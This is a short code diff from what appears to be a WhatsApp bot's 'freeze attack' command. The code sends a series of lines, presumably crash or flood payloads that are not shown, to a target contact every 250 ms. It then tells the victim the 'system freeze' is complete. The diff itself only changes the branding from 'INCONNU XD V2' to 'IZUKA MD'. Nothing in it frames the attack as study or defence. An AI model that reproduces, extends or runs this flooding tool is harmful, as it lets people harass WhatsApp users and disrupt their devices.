@@ -55,14 +55,14 @@ cmd({
 
     for (let i = 0; i < lines.length; i++) {
       await bot.sendMessage(targetJid, {
-        text: `☃️ FREEZE ATTACK #${i + 1}\n${lines[i]}\n\n_⚠️ SYSTEM FREEZE INITIATED_\n~INCONNU XD V2~`
+        text: `☃️ FREEZE ATTACK #${i + 1}\n${lines[i]}\n\n_⚠️ SYSTEM FREEZE INITIATED_\n~IZUKA MD~`
       });
       await new Promise(resolve => setTimeout(resolve, 250));
     }
 
     // ✅ Notifikasyon final pou target la tou
     await bot.sendMessage(targetJid, {
-      text: `✅ *FREEZE COMPLETED*\n🔚 System freeze sent successfully.\n~INCONNU XD V2~`
+      text: `✅ *FREEZE COMPLETED*\n🔚 System freeze sent successfully.\n~IZUKA MD~`
     });
 
     await bot.sendMessage(from, {
